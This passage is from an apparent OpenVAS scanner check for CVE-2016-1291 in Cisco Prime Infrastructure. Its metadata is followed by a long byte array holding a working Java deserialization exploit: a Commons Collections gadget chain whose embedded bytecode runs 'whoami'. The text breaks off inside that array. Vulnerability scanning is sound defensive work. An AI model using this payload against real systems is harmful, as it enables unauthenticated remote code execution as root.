###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cisco_pis_cisco-sa-20160406-remcode_remote_check.nasl 11026 2018-08-17 08:52:26Z cfischer $
#
# Cisco Prime Infrastructure Remote Code Execution Vulnerability (Active Check)
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105838");
  script_cve_id("CVE-2016-1291");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 11026 $");

  script_name("Cisco Prime Infrastructure Remote Code Execution Vulnerability (Active Check)");

  script_xref(name:"URL", value:"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160406-remcode");

  script_tag(name:"impact", value:"An attacker could exploit this vulnerability by sending an HTTP POST with crafted deserialized user data.
  An exploit could allow the attacker to execute arbitrary code with root-level privileges on the affected system, which could be used to conduct further attacks.");
  script_tag(name:"vuldetect", value:"Try to execute a command by sending a special crafted java object via HTTP POST request.");
  script_tag(name:"insight", value:"The vulnerability is due to insufficient sanitization of HTTP user-supplied input.");
  script_tag(name:"solution", value:"Update to Cisco Prime Infrastructure 3.0.2/2.2.3 Update 4 or newer");
  script_tag(name:"summary", value:"A vulnerability in the web interface of Cisco Prime Infrastructure could allow an unauthenticated, remote attacker
  to execute arbitrary code on a targeted system.");
  script_tag(name:"affected", value:"Cisco Prime Infrastructure prior to 3.0.2/2.2.3 Update 4");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"last_modification", value:"$Date: 2018-08-17 10:52:26 +0200 (Fri, 17 Aug 2018) $");
  script_tag(name:"creation_date", value:"2016-07-31 16:10:11 +0200 (Sun, 31 Jul 2016)");
  script_category(ACT_ATTACK);
  script_family("CISCO");
  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_dependencies("gb_cisco_pis_web_detect.nasl");
  script_mandatory_keys("cisco/pis/http/port");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_kb_item("cisco/pis/http/port") ) exit( 0 );

payload = raw_string(
0xac,0xed,0x00,0x05,0x77,0x1d,0x00,0x1b,0x49,0x20,0x68,0x61,0x64,0x20,0x73,0x6f,
0x6d,0x65,0x74,0x68,0x69,0x6e,0x67,0x20,0x66,0x6f,0x72,0x20,0x74,0x68,0x69,0x73,
0x2e,0x2e,0x2e,0x73,0x72,0x00,0x32,0x73,0x75,0x6e,0x2e,0x72,0x65,0x66,0x6c,0x65,
0x63,0x74,0x2e,0x61,0x6e,0x6e,0x6f,0x74,0x61,0x74,0x69,0x6f,0x6e,0x2e,0x41,0x6e,
0x6e,0x6f,0x74,0x61,0x74,0x69,0x6f,0x6e,0x49,0x6e,0x76,0x6f,0x63,0x61,0x74,0x69,
0x6f,0x6e,0x48,0x61,0x6e,0x64,0x6c,0x65,0x72,0x55,0xca,0xf5,0x0f,0x15,0xcb,0x7e,
0xa5,0x02,0x00,0x02,0x4c,0x00,0x0c,0x6d,0x65,0x6d,0x62,0x65,0x72,0x56,0x61,0x6c,
0x75,0x65,0x73,0x74,0x00,0x0f,0x4c,0x6a,0x61,0x76,0x61,0x2f,0x75,0x74,0x69,0x6c,
0x2f,0x4d,0x61,0x70,0x3b,0x4c,0x00,0x04,0x74,0x79,0x70,0x65,0x74,0x00,0x11,0x4c,
0x6a,0x61,0x76,0x61,0x2f,0x6c,0x61,0x6e,0x67,0x2f,0x43,0x6c,0x61,0x73,0x73,0x3b,
0x78,0x70,0x73,0x7d,0x00,0x00,0x00,0x01,0x00,0x0d,0x6a,0x61,0x76,0x61,0x2e,0x75,
0x74,0x69,0x6c,0x2e,0x4d,0x61,0x70,0x78,0x72,0x00,0x17,0x6a,0x61,0x76,0x61,0x2e,
0x6c,0x61,0x6e,0x67,0x2e,0x72,0x65,0x66,0x6c,0x65,0x63,0x74,0x2e,0x50,0x72,0x6f,
0x78,0x79,0xe1,0x27,0xda,0x20,0xcc,0x10,0x43,0xcb,0x02,0x00,0x01,0x4c,0x00,0x01,
0x68,0x74,0x00,0x25,0x4c,0x6a,0x61,0x76,0x61,0x2f,0x6c,0x61,0x6e,0x67,0x2f,0x72,
0x65,0x66,0x6c,0x65,0x63,0x74,0x2f,0x49,0x6e,0x76,0x6f,0x63,0x61,0x74,0x69,0x6f,
0x6e,0x48,0x61,0x6e,0x64,0x6c,0x65,0x72,0x3b,0x78,0x70,0x73,0x71,0x00,0x7e,0x00,
0x00,0x73,0x72,0x00,0x2a,0x6f,0x72,0x67,0x2e,0x61,0x70,0x61,0x63,0x68,0x65,0x2e,
0x63,0x6f,0x6d,0x6d,0x6f,0x6e,0x73,0x2e,0x63,0x6f,0x6c,0x6c,0x65,0x63,0x74,0x69,
0x6f,0x6e,0x73,0x2e,0x6d,0x61,0x70,0x2e,0x4c,0x61,0x7a,0x79,0x4d,0x61,0x70,0x6e,
0xe5,0x94,0x82,0x9e,0x79,0x10,0x94,0x03,0x00,0x01,0x4c,0x00,0x07,0x66,0x61,0x63,
0x74,0x6f,0x72,0x79,0x74,0x00,0x2c,0x4c,0x6f,0x72,0x67,0x2f,0x61,0x70,0x61,0x63,
0x68,0x65,0x2f,0x63,0x6f,0x6d,0x6d,0x6f,0x6e,0x73,0x2f,0x63,0x6f,0x6c,0x6c,0x65,
0x63,0x74,0x69,0x6f,0x6e,0x73,0x2f,0x54,0x72,0x61,0x6e,0x73,0x66,0x6f,0x72,0x6d,
0x65,0x72,0x3b,0x78,0x70,0x73,0x72,0x00,0x3a,0x6f,0x72,0x67,0x2e,0x61,0x70,0x61,
0x63,0x68,0x65,0x2e,0x63,0x6f,0x6d,0x6d,0x6f,0x6e,0x73,0x2e,0x63,0x6f,0x6c,0x6c,
0x65,0x63,0x74,0x69,0x6f,0x6e,0x73,0x2e,0x66,0x75,0x6e,0x63,0x74,0x6f,0x72,0x73,
0x2e,0x43,0x68,0x61,0x69,0x6e,0x65,0x64,0x54,0x72,0x61,0x6e,0x73,0x66,0x6f,0x72,
0x6d,0x65,0x72,0x30,0xc7,0x97,0xec,0x28,0x7a,0x97,0x04,0x02,0x00,0x01,0x5b,0x00,
0x0d,0x69,0x54,0x72,0x61,0x6e,0x73,0x66,0x6f,0x72,0x6d,0x65,0x72,0x73,0x74,0x00,
0x2d,0x5b,0x4c,0x6f,0x72,0x67,0x2f,0x61,0x70,0x61,0x63,0x68,0x65,0x2f,0x63,0x6f,
0x6d,0x6d,0x6f,0x6e,0x73,0x2f,0x63,0x6f,0x6c,0x6c,0x65,0x63,0x74,0x69,0x6f,0x6e,
0x73,0x2f,0x54,0x72,0x61,0x6e,0x73,0x66,0x6f,0x72,0x6d,0x65,0x72,0x3b,0x78,0x70,
0x75,0x72,0x00,0x2d,0x5b,0x4c,0x6f,0x72,0x67,0x2e,0x61,0x70,0x61,0x63,0x68,0x65,
0x2e,0x63,0x6f,0x6d,0x6d,0x6f,0x6e,0x73,0x2e,0x63,0x6f,0x6c,0x6c,0x65,0x63,0x74,
0x69,0x6f,0x6e,0x73,0x2e,0x54,0x72,0x61,0x6e,0x73,0x66,0x6f,0x72,0x6d,0x65,0x72,
0x3b,0xbd,0x56,0x2a,0xf1,0xd8,0x34,0x18,0x99,0x02,0x00,0x00,0x78,0x70,0x00,0x00,
0x00,0x02,0x73,0x72,0x00,0x3b,0x6f,0x72,0x67,0x2e,0x61,0x70,0x61,0x63,0x68,0x65,
0x2e,0x63,0x6f,0x6d,0x6d,0x6f,0x6e,0x73,0x2e,0x63,0x6f,0x6c,0x6c,0x65,0x63,0x74,
0x69,0x6f,0x6e,0x73,0x2e,0x66,0x75,0x6e,0x63,0x74,0x6f,0x72,0x73,0x2e,0x43,0x6f,
0x6e,0x73,0x74,0x61,0x6e,0x74,0x54,0x72,0x61,0x6e,0x73,0x66,0x6f,0x72,0x6d,0x65,
0x72,0x58,0x76,0x90,0x11,0x41,0x02,0xb1,0x94,0x02,0x00,0x01,0x4c,0x00,0x09,0x69,
0x43,0x6f,0x6e,0x73,0x74,0x61,0x6e,0x74,0x74,0x00,0x12,0x4c,0x6a,0x61,0x76,0x61,
0x2f,0x6c,0x61,0x6e,0x67,0x2f,0x4f,0x62,0x6a,0x65,0x63,0x74,0x3b,0x78,0x70,0x76,
0x72,0x00,0x37,0x63,0x6f,0x6d,0x2e,0x73,0x75,0x6e,0x2e,0x6f,0x72,0x67,0x2e,0x61,
0x70,0x61,0x63,0x68,0x65,0x2e,0x78,0x61,0x6c,0x61,0x6e,0x2e,0x69,0x6e,0x74,0x65,
0x72,0x6e,0x61,0x6c,0x2e,0x78,0x73,0x6c,0x74,0x63,0x2e,0x74,0x72,0x61,0x78,0x2e,
0x54,0x72,0x41,0x58,0x46,0x69,0x6c,0x74,0x65,0x72,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x78,0x70,0x73,0x72,0x00,0x3e,0x6f,0x72,0x67,0x2e,0x61,
0x70,0x61,0x63,0x68,0x65,0x2e,0x63,0x6f,0x6d,0x6d,0x6f,0x6e,0x73,0x2e,0x63,0x6f,
0x6c,0x6c,0x65,0x63,0x74,0x69,0x6f,0x6e,0x73,0x2e,0x66,0x75,0x6e,0x63,0x74,0x6f,
0x72,0x73,0x2e,0x49,0x6e,0x73,0x74,0x61,0x6e,0x74,0x69,0x61,0x74,0x65,0x54,0x72,
0x61,0x6e,0x73,0x66,0x6f,0x72,0x6d,0x65,0x72,0x34,0x8b,0xf4,0x7f,0xa4,0x86,0xd0,
0x3b,0x02,0x00,0x02,0x5b,0x00,0x05,0x69,0x41,0x72,0x67,0x73,0x74,0x00,0x13,0x5b,
0x4c,0x6a,0x61,0x76,0x61,0x2f,0x6c,0x61,0x6e,0x67,0x2f,0x4f,0x62,0x6a,0x65,0x63,
0x74,0x3b,0x5b,0x00,0x0b,0x69,0x50,0x61,0x72,0x61,0x6d,0x54,0x79,0x70,0x65,0x73,
0x74,0x00,0x12,0x5b,0x4c,0x6a,0x61,0x76,0x61,0x2f,0x6c,0x61,0x6e,0x67,0x2f,0x43,
0x6c,0x61,0x73,0x73,0x3b,0x78,0x70,0x75,0x72,0x00,0x13,0x5b,0x4c,0x6a,0x61,0x76,
0x61,0x2e,0x6c,0x61,0x6e,0x67,0x2e,0x4f,0x62,0x6a,0x65,0x63,0x74,0x3b,0x90,0xce,
0x58,0x9f,0x10,0x73,0x29,0x6c,0x02,0x00,0x00,0x78,0x70,0x00,0x00,0x00,0x01,0x73,
0x72,0x00,0x3a,0x63,0x6f,0x6d,0x2e,0x73,0x75,0x6e,0x2e,0x6f,0x72,0x67,0x2e,0x61,
0x70,0x61,0x63,0x68,0x65,0x2e,0x78,0x61,0x6c,0x61,0x6e,0x2e,0x69,0x6e,0x74,0x65,
0x72,0x6e,0x61,0x6c,0x2e,0x78,0x73,0x6c,0x74,0x63,0x2e,0x74,0x72,0x61,0x78,0x2e,
0x54,0x65,0x6d,0x70,0x6c,0x61,0x74,0x65,0x73,0x49,0x6d,0x70,0x6c,0x09,0x57,0x4f,
0xc1,0x6e,0xac,0xab,0x33,0x03,0x00,0x06,0x49,0x00,0x0d,0x5f,0x69,0x6e,0x64,0x65,
0x6e,0x74,0x4e,0x75,0x6d,0x62,0x65,0x72,0x49,0x00,0x0e,0x5f,0x74,0x72,0x61,0x6e,
0x73,0x6c,0x65,0x74,0x49,0x6e,0x64,0x65,0x78,0x5b,0x00,0x0a,0x5f,0x62,0x79,0x74,
0x65,0x63,0x6f,0x64,0x65,0x73,0x74,0x00,0x03,0x5b,0x5b,0x42,0x5b,0x00,0x06,0x5f,
0x63,0x6c,0x61,0x73,0x73,0x71,0x00,0x7e,0x00,0x18,0x4c,0x00,0x05,0x5f,0x6e,0x61,
0x6d,0x65,0x74,0x00,0x12,0x4c,0x6a,0x61,0x76,0x61,0x2f,0x6c,0x61,0x6e,0x67,0x2f,
0x53,0x74,0x72,0x69,0x6e,0x67,0x3b,0x4c,0x00,0x11,0x5f,0x6f,0x75,0x74,0x70,0x75,
0x74,0x50,0x72,0x6f,0x70,0x65,0x72,0x74,0x69,0x65,0x73,0x74,0x00,0x16,0x4c,0x6a,
0x61,0x76,0x61,0x2f,0x75,0x74,0x69,0x6c,0x2f,0x50,0x72,0x6f,0x70,0x65,0x72,0x74,
0x69,0x65,0x73,0x3b,0x78,0x70,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0x75,0x72,
0x00,0x03,0x5b,0x5b,0x42,0x4b,0xfd,0x19,0x15,0x67,0x67,0xdb,0x37,0x02,0x00,0x00,
0x78,0x70,0x00,0x00,0x00,0x02,0x75,0x72,0x00,0x02,0x5b,0x42,0xac,0xf3,0x17,0xf8,
0x06,0x08,0x54,0xe0,0x02,0x00,0x00,0x78,0x70,0x00,0x00,0x06,0x7f,0xca,0xfe,0xba,
0xbe,0x00,0x00,0x00,0x31,0x00,0x38,0x0a,0x00,0x03,0x00,0x22,0x07,0x00,0x36,0x07,
0x00,0x25,0x07,0x00,0x26,0x01,0x00,0x10,0x73,0x65,0x72,0x69,0x61,0x6c,0x56,0x65,
0x72,0x73,0x69,0x6f,0x6e,0x55,0x49,0x44,0x01,0x00,0x01,0x4a,0x01,0x00,0x0d,0x43,
0x6f,0x6e,0x73,0x74,0x61,0x6e,0x74,0x56,0x61,0x6c,0x75,0x65,0x05,0xad,0x20,0x93,
0xf3,0x91,0xdd,0xef,0x3e,0x01,0x00,0x06,0x3c,0x69,0x6e,0x69,0x74,0x3e,0x01,0x00,
0x03,0x28,0x29,0x56,0x01,0x00,0x04,0x43,0x6f,0x64,0x65,0x01,0x00,0x0f,0x4c,0x69,
0x6e,0x65,0x4e,0x75,0x6d,0x62,0x65,0x72,0x54,0x61,0x62,0x6c,0x65,0x01,0x00,0x12,
0x4c,0x6f,0x63,0x61,0x6c,0x56,0x61,0x72,0x69,0x61,0x62,0x6c,0x65,0x54,0x61,0x62,
0x6c,0x65,0x01,0x00,0x04,0x74,0x68,0x69,0x73,0x01,0x00,0x13,0x53,0x74,0x75,0x62,
0x54,0x72,0x61,0x6e,0x73,0x6c,0x65,0x74,0x50,0x61,0x79,0x6c,0x6f,0x61,0x64,0x01,
0x00,0x0c,0x49,0x6e,0x6e,0x65,0x72,0x43,0x6c,0x61,0x73,0x73,0x65,0x73,0x01,0x00,
0x35,0x4c,0x79,0x73,0x6f,0x73,0x65,0x72,0x69,0x61,0x6c,0x2f,0x70,0x61,0x79,0x6c,
0x6f,0x61,0x64,0x73,0x2f,0x75,0x74,0x69,0x6c,0x2f,0x47,0x61,0x64,0x67,0x65,0x74,
0x73,0x24,0x53,0x74,0x75,0x62,0x54,0x72,0x61,0x6e,0x73,0x6c,0x65,0x74,0x50,0x61,
0x79,0x6c,0x6f,0x61,0x64,0x3b,0x01,0x00,0x09,0x74,0x72,0x61,0x6e,0x73,0x66,0x6f,
0x72,0x6d,0x01,0x00,0x72,0x28,0x4c,0x63,0x6f,0x6d,0x2f,0x73,0x75,0x6e,0x2f,0x6f,
0x72,0x67,0x2f,0x61,0x70,0x61,0x63,0x68,0x65,0x2f,0x78,0x61,0x6c,0x61,0x6e,0x2f,
0x69,0x6e,0x74,0x65,0x72,0x6e,0x61,0x6c,0x2f,0x78,0x73,0x6c,0x74,0x63,0x2f,0x44,
0x4f,0x4d,0x3b,0x5b,0x4c,0x63,0x6f,0x6d,0x2f,0x73,0x75,0x6e,0x2f,0x6f,0x72,0x67,
0x2f,0x61,0x70,0x61,0x63,0x68,0x65,0x2f,0x78,0x6d,0x6c,0x2f,0x69,0x6e,0x74,0x65,
0x72,0x6e,0x61,0x6c,0x2f,0x73,0x65,0x72,0x69,0x61,0x6c,0x69,0x7a,0x65,0x72,0x2f,
0x53,0x65,0x72,0x69,0x61,0x6c,0x69,0x7a,0x61,0x74,0x69,0x6f,0x6e,0x48,0x61,0x6e,
0x64,0x6c,0x65,0x72,0x3b,0x29,0x56,0x01,0x00,0x08,0x64,0x6f,0x63,0x75,0x6d,0x65,
0x6e,0x74,0x01,0x00,0x2d,0x4c,0x63,0x6f,0x6d,0x2f,0x73,0x75,0x6e,0x2f,0x6f,0x72,
0x67,0x2f,0x61,0x70,0x61,0x63,0x68,0x65,0x2f,0x78,0x61,0x6c,0x61,0x6e,0x2f,0x69,
0x6e,0x74,0x65,0x72,0x6e,0x61,0x6c,0x2f,0x78,0x73,0x6c,0x74,0x63,0x2f,0x44,0x4f,
0x4d,0x3b,0x01,0x00,0x08,0x68,0x61,0x6e,0x64,0x6c,0x65,0x72,0x73,0x01,0x00,0x42,
0x5b,0x4c,0x63,0x6f,0x6d,0x2f,0x73,0x75,0x6e,0x2f,0x6f,0x72,0x67,0x2f,0x61,0x70,
0x61,0x63,0x68,0x65,0x2f,0x78,0x6d,0x6c,0x2f,0x69,0x6e,0x74,0x65,0x72,0x6e,0x61,
0x6c,0x2f,0x73,0x65,0x72,0x69,0x61,0x6c,0x69,0x7a,0x65,0x72,0x2f,0x53,0x65,0x72,
0x69,0x61,0x6c,0x69,0x7a,0x61,0x74,0x69,0x6f,0x6e,0x48,0x61,0x6e,0x64,0x6c,0x65,
0x72,0x3b,0x01,0x00,0x0a,0x45,0x78,0x63,0x65,0x70,0x74,0x69,0x6f,0x6e,0x73,0x07,
0x00,0x27,0x01,0x00,0xa6,0x28,0x4c,0x63,0x6f,0x6d,0x2f,0x73,0x75,0x6e,0x2f,0x6f,
0x72,0x67,0x2f,0x61,0x70,0x61,0x63,0x68,0x65,0x2f,0x78,0x61,0x6c,0x61,0x6e,0x2f,
0x69,0x6e,0x74,0x65,0x72,0x6e,0x61,0x6c,0x2f,0x78,0x73,0x6c,0x74,0x63,0x2f,0x44,
0x4f,0x4d,0x3b,0x4c,0x63,0x6f,0x6d,0x2f,0x73,0x75,0x6e,0x2f,0x6f,0x72,0x67,0x2f,
0x61,0x70,0x61,0x63,0x68,0x65,0x2f,0x78,0x6d,0x6c,0x2f,0x69,0x6e,0x74,0x65,0x72,
0x6e,0x61,0x6c,0x2f,0x64,0x74,0x6d,0x2f,0x44,0x54,0x4d,0x41,0x78,0x69,0x73,0x49,
0x74,0x65,0x72,0x61,0x74,0x6f,0x72,0x3b,0x4c,0x63,0x6f,0x6d,0x2f,0x73,0x75,0x6e,
0x2f,0x6f,0x72,0x67,0x2f,0x61,0x70,0x61,0x63,0x68,0x65,0x2f,0x78,0x6d,0x6c,0x2f,
0x69,0x6e,0x74,0x65,0x72,0x6e,0x61,0x6c,0x2f,0x73,0x65,0x72,0x69,0x61,0x6c,0x69,
0x7a,0x65,0x72,0x2f,0x53,0x65,0x72,0x69,0x61,0x6c,0x69,0x7a,0x61,0x74,0x69,0x6f,
0x6e,0x48,0x61,0x6e,0x64,0x6c,0x65,0x72,0x3b,0x29,0x56,0x01,0x00,0x08,0x69,0x74,
0x65,0x72,0x61,0x74,0x6f,0x72,0x01,0x00,0x35,0x4c,0x63,0x6f,0x6d,0x2f,0x73,0x75,
0x6e,0x2f,0x6f,0x72,0x67,0x2f,0x61,0x70,0x61,0x63,0x68,0x65,0x2f,0x78,0x6d,0x6c,
0x2f,0x69,0x6e,0x74,0x65,0x72,0x6e,0x61,0x6c,0x2f,0x64,0x74,0x6d,0x2f,0x44,0x54,
0x4d,0x41,0x78,0x69,0x73,0x49,0x74,0x65,0x72,0x61,0x74,0x6f,0x72,0x3b,0x01,0x00,
0x07,0x68,0x61,0x6e,0x64,0x6c,0x65,0x72,0x01,0x00,0x41,0x4c,0x63,0x6f,0x6d,0x2f,
0x73,0x75,0x6e,0x2f,0x6f,0x72,0x67,0x2f,0x61,0x70,0x61,0x63,0x68,0x65,0x2f,0x78,
0x6d,0x6c,0x2f,0x69,0x6e,0x74,0x65,0x72,0x6e,0x61,0x6c,0x2f,0x73,0x65,0x72,0x69,
0x61,0x6c,0x69,0x7a,0x65,0x72,0x2f,0x53,0x65,0x72,0x69,0x61,0x6c,0x69,0x7a,0x61,
0x74,0x69,0x6f,0x6e,0x48,0x61,0x6e,0x64,0x6c,0x65,0x72,0x3b,0x01,0x00,0x0a,0x53,
0x6f,0x75,0x72,0x63,0x65,0x46,0x69,0x6c,0x65,0x01,0x00,0x0c,0x47,0x61,0x64,0x67,
0x65,0x74,0x73,0x2e,0x6a,0x61,0x76,0x61,0x0c,0x00,0x0a,0x00,0x0b,0x07,0x00,0x28,
0x01,0x00,0x33,0x79,0x73,0x6f,0x73,0x65,0x72,0x69,0x61,0x6c,0x2f,0x70,0x61,0x79,
0x6c,0x6f,0x61,0x64,0x73,0x2f,0x75,0x74,0x69,0x6c,0x2f,0x47,0x61,0x64,0x67,0x65,
0x74,0x73,0x24,0x53,0x74,0x75,0x62,0x54,0x72,0x61,0x6e,0x73,0x6c,0x65,0x74,0x50,
0x61,0x79,0x6c,0x6f,0x61,0x64,0x01,0x00,0x40,0x63,0x6f,0x6d,0x2f,0x73,0x75,0x6e,
0x2f,0x6f,0x72,0x67,0x2f,0x61,0x70,0x61,0x63,0x68,0x65,0x2f,0x78,0x61,0x6c,0x61,
0x6e,0x2f,0x69,0x6e,0x74,0x65,0x72,0x6e,0x61,0x6c,0x2f,0x78,0x73,0x6c,0x74,0x63,
0x2f,0x72,0x75,0x6e,0x74,0x69,0x6d,0x65,0x2f,0x41,0x62,0x73,0x74,0x72,0x61,0x63,
0x74,0x54,0x72,0x61,0x6e,0x73,0x6c,0x65,0x74,0x01,0x00,0x14,0x6a,0x61,0x76,0x61,
0x2f,0x69,0x6f,0x2f,0x53,0x65,0x72,0x69,0x61,0x6c,0x69,0x7a,0x61,0x62,0x6c,0x65,
0x01,0x00,0x39,0x63,0x6f,0x6d,0x2f,0x73,0x75,0x6e,0x2f,0x6f,0x72,0x67,0x2f,0x61,
0x70,0x61,0x63,0x68,0x65,0x2f,0x78,0x61,0x6c,0x61,0x6e,0x2f,0x69,0x6e,0x74,0x65,
0x72,0x6e,0x61,0x6c,0x2f,0x78,0x73,0x6c,0x74,0x63,0x2f,0x54,0x72,0x61,0x6e,0x73,
0x6c,0x65,0x74,0x45,0x78,0x63,0x65,0x70,0x74,0x69,0x6f,0x6e,0x01,0x00,0x1f,0x79,
0x73,0x6f,0x73,0x65,0x72,0x69,0x61,0x6c,0x2f,0x70,0x61,0x79,0x6c,0x6f,0x61,0x64,
0x73,0x2f,0x75,0x74,0x69,0x6c,0x2f,0x47,0x61,0x64,0x67,0x65,0x74,0x73,0x01,0x00,
0x08,0x3c,0x63,0x6c,0x69,0x6e,0x69,0x74,0x3e,0x01,0x00,0x11,0x6a,0x61,0x76,0x61,
0x2f,0x6c,0x61,0x6e,0x67,0x2f,0x52,0x75,0x6e,0x74,0x69,0x6d,0x65,0x07,0x00,0x2a,
0x01,0x00,0x0a,0x67,0x65,0x74,0x52,0x75,0x6e,0x74,0x69,0x6d,0x65,0x01,0x00,0x15,
0x28,0x29,0x4c,0x6a,0x61,0x76,0x61,0x2f,0x6c,0x61,0x6e,0x67,0x2f,0x52,0x75,0x6e,
0x74,0x69,0x6d,0x65,0x3b,0x0c,0x00,0x2c,0x00,0x2d,0x0a,0x00,0x2b,0x00,0x2e,0x01,
0x00,0x06,0x77,0x68,0x6f,0x61,0x6d,0x69,0x08,0x00,0x30,0x01,0x00,0x04,0x65,0x78,
0x65,0x63,0x01,0x00,0x27,0x28,0x4c,0x6a,0x61,0x76,0x61,0x2f,0x6c,0x61,0x6e,0x67,
0x2f,0x53,0x74,0x72,0x69,0x6e,0x67,0x3b,0x29,0x4c,0x6a,0x61,0x76,0x61,0x2f,0x6c,
0x61,0x6e,0x67,0x2f,0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x3b,0x0c,0x00,0x32,0x00,
0x33,0x0a,0x00,0x2b,0x00,0x34,0x01,0x00,0x1c,0x79,0x73,0x6f,0x73,0x65,0x72,0x69,
0x61,0x6c,0x2f,0x50,0x77,0x6e,0x65,0x72,0x34,0x30,0x31,0x33,0x33,0x32,0x30,0x31,
0x31,0x31,0x32,0x32,0x31,0x01,0x00,0x1e,0x4c,0x79,0x73,0x6f,0x73,0x65,0x72,0x69,
0x61,0x6c,0x2f,0x50,0x77,0x6e,0x65,0x72,0x34,0x30,0x31,0x33,0x33,0x32,0x30,0x31,
0x31,0x31,0x32,0x32,0x31,0x3b,0x00,0x21,0x00,0x02,0x00,0x03,0x00,0x01,0x00,0x04,
0x00,0x01,0x00,0x1a,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x07,0x00,0x00,0x00,0x02,
0x00,0x08,0x00,0x04,0x00,0x01,0x00,0x0a,0x00,0x0b,0x00,0x01,0x00,0x0c,0x00,0x00,
0x00,0x2f,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x05,0x2a,0xb7,0x00,0x01,0xb1,0x00,
0x00,0x00,0x02,0x00,0x0d,0x00,0x00,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x25,0x00,
0x0e,0x00,0x00,0x00,0x0c,0x00,0x01,0x00,0x00,0x00,0x05,0x00,0x0f,0x00,0x37,0x00,
0x00,0x00,0x01,0x00,0x13,0x00,0x14,0x00,0x02,0x00,0x0c,0x00,0x00,0x00,0x3f,0x00,
0x00,0x00,0x03,0x00,0x00,0x00,0x01,0xb1,0x00,0x00,0x00,0x02,0x00,0x0d,0x00,0x00,
0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x28,0x00,0x0e,0x00,0x00,0x00,0x20,0x00,0x03,
0x00,0x00,0x00,0x01,0x00,0x0f,0x00,0x37,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x15,
0x00,0x16,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x17,0x00,0x18,0x00,0x02,0x00,0x19,
0x00,0x00,0x00,0x04,0x00,0x01,0x00,0x1a,0x00,0x01,0x00,0x13,0x00,0x1b,0x00,0x02,
0x00,0x0c,0x00,0x00,0x00,0x49,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x01,0xb1,0x00,
0x00,0x00,0x02,0x00,0x0d,0x00,0x00,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x2b,0x00,
0x0e,0x00,0x00,0x00,0x2a,0x00,0x04,0x00,0x00,0x00,0x01,0x00,0x0f,0x00,0x37,0x00,
0x00,0x00,0x00,0x00,0x01,0x00,0x15,0x00,0x16,0x00,0x01,0x00,0x00,0x00,0x01,0x00,
0x1c,0x00,0x1d,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x1e,0x00,0x1f,0x00,0x03,0x00,
0x19,0x00,0x00,0x00,0x04,0x00,0x01,0x00,0x1a,0x00,0x08,0x00,0x29,0x00,0x0b,0x00,
0x01,0x00,0x0c,0x00,0x00,0x00,0x1b,0x00,0x03,0x00,0x02,0x00,0x00,0x00,0x0f,0xa7,
0x00,0x03,0x01,0x4c,0xb8,0x00,0x2f,0x12,0x31,0xb6,0x00,0x35,0x57,0xb1,0x00,0x00,
0x00,0x00,0x00,0x02,0x00,0x20,0x00,0x00,0x00,0x02,0x00,0x21,0x00,0x11,0x00,0x00,
0x00,0x0a,0x00,0x01,0x00,0x02,0x00,0x23,0x00,0x10,0x00,0x09,0x75,0x71,0x00,0x7e,
0x00,0x23,0x00,0x00,0x01,0xd4,0xca,0xfe,0xba,0xbe,0x00,0x00,0x00,0x31,0x00,0x1b,
0x0a,0x00,0x03,0x00,0x15,0x07,0x00,0x17,0x07,0x00,0x18,0x07,0x00,0x19,0x01,0x00,
0x10,0x73,0x65,0x72,0x69,0x61,0x6c,0x56,0x65,0x72,0x73,0x69,0x6f,0x6e,0x55,0x49,
0x44,0x01,0x00,0x01,0x4a,0x01,0x00,0x0d,0x43,0x6f,0x6e,0x73,0x74,0x61,0x6e,0x74,
0x56,0x61,0x6c,0x75,0x65,0x05,0x71,0xe6,0x69,0xee,0x3c,0x6d,0x47,0x18,0x01,0x00,
0x06,0x3c,0x69,0x6e,0x69,0x74,0x3e,0x01,0x00,0x03,0x28,0x29,0x56,0x01,0x00,0x04,
0x43,0x6f,0x64,0x65,0x01,0x00,0x0f,0x4c,0x69,0x6e,0x65,0x4e,0x75,0x6d,0x62,0x65,
0x72,0x54,0x61,0x62,0x6c,0x65,0x01,0x00,0x12,0x4c,0x6f,0x63,0x61,0x6c,0x56,0x61,
0x72,0x69,0x61,0x62,0x6c,0x65,0x54,0x61,0x62,0x6c,0x65,0x01,0x00,0x04,0x74,0x68,
0x69,0x73,0x01,0x00,0x03,0x46,0x6f,0x6f,0x01,0x00,0x0c,0x49,0x6e,0x6e,0x65,0x72,
0x43,0x6c,0x61,0x73,0x73,0x65,0x73,0x01,0x00,0x25,0x4c,0x79,0x73,0x6f,0x73,0x65,
0x72,0x69,0x61,0x6c,0x2f,0x70,0x61,0x79,0x6c,0x6f,0x61,0x64,0x73,0x2f,0x75,0x74,
0x69,0x6c,0x2f,0x47,0x61,0x64,0x67,0x65,0x74,0x73,0x24,0x46,0x6f,0x6f,0x3b,0x01,
